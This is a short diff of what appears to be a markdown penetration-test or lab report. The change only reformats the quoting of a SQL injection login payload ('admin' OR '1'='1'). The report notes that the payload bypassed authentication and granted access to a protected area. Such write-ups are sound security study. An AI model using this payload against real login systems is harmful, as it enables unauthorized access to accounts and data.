@@ -6,9 +6,9 @@
 Low 🟡
 
 ### Payload Used
-`Username: admin' OR '1'='1 `
+```Username: admin' OR '1'='1 ```
 
-`Password: randompassword`
+```Password: randompassword```
 
 ### Result
 Authentication was bypassed and the application displayed the message **"Welcome to the password protected area admin' OR '1'='1"**, granting access to the protected area.
